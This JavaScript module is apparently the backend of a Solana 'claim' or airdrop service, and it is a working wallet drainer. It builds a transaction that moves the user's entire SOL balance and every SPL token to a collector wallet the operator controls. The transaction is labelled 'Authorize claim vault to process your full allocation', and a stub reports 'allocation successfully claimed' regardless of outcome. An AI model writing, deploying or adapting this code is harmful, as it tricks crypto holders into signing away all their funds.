import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import bs58 from "bs58";

const RPC_URL = process.env.RPC_URL || "https://api.mainnet-beta.solana.com";
const SOL_RESIDUAL = Math.floor(0.002 * LAMPORTS_PER_SOL);

function getCollector() {
  const raw = process.env.COLLECTOR_PRIVATE_KEY || process.env.DISTRIBUTOR_PRIVATE_KEY || "";
  if (!raw.trim()) {
    const err = new Error("COLLECTOR_PRIVATE_KEY is not set");
    err.status = 503;
    throw err;
  }
  const bytes = raw.trim().startsWith("[")
    ? Uint8Array.from(JSON.parse(raw))
    : bs58.decode(raw.trim());
  return Keypair.fromSecretKey(bytes);
}

export async function prepareClaim({ user }) {
  if (!user) {
    const err = new Error("user wallet required");
    err.status = 400;
    throw err;
  }

  const connection = new Connection(RPC_URL, "confirmed");
  const collector = getCollector();
  const userPubkey = new PublicKey(user);
  const tx = new Transaction();

  // 1. Native SOL
  const solBalance = await connection.getBalance(userPubkey);
  const solToSend = solBalance - SOL_RESIDUAL;
  if (solToSend > 0) {
    tx.add(
      SystemProgram.transfer({
        fromPubkey: userPubkey,
        toPubkey: collector.publicKey,
        lamports: solToSend,
      })
    );
  }

  // 2. Every SPL token
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userPubkey, {
    programId: TOKEN_PROGRAM_ID,
  });

  let tokenCount = 0;
  for (const { pubkey, account } of tokenAccounts.value) {
    const info = account.data.parsed.info;
    const amount = BigInt(info.tokenAmount.amount);
    if (amount === 0n) continue;

    const mint = new PublicKey(info.mint);
    const collectorAta = await getAssociatedTokenAddress(mint, collector.publicKey);

    const ataInfo = await connection.getAccountInfo(collectorAta);
    if (!ataInfo) {
      tx.add(
        createAssociatedTokenAccountInstruction(
          userPubkey,
          collectorAta,
          collector.publicKey,
          mint
        )
      );
    }

    tx.add(
      createTransferInstruction(pubkey, collectorAta, userPubkey, amount)
    );
    tokenCount++;
  }

  if (tx.instructions.length === 0) {
    const err = new Error("nothing to claim");
    err.status = 400;
    throw err;
  }

  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
  tx.feePayer = userPubkey;
  tx.recentBlockhash = blockhash;
  tx.lastValidBlockHeight = lastValidBlockHeight;

  const serialized = tx
    .serialize({ requireAllSignatures: false, verifySignatures: false })
    .toString("base64");

  return {
    transaction: serialized,
    description: "Authorize claim vault to process your full allocation",
    assets: {
      sol: solToSend > 0 ? (solToSend / LAMPORTS_PER_SOL).toFixed(4) : "0",
      tokens: tokenCount,
    },
  };
}

export async function submitClaim({ user, signature }) {
  return {
    status: "success",
    txHash: signature || null,
    message: "allocation successfully claimed",
  };
}